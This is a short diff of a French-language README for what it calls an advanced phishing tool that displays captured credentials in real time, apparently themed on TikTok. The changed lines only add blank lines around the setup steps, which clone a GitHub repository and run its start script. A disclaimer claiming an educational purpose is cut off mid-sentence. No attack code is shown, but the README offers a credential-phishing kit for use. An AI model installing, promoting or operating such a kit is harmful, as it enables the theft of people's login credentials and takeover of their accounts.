@@ -11,8 +11,11 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
 1. **Mettre à jour les paquets** :
    ```bash
 rm -rf tiktok
+
    git clone https://github.com/Samsmis01/tiktok.git 
+   
  cd tiktok
+ 
  bash start.sh
 
   ⚠️ NB:CECI EST DANS LE CADRE ÉDUCATIF, EN CAS D'UTILISATION
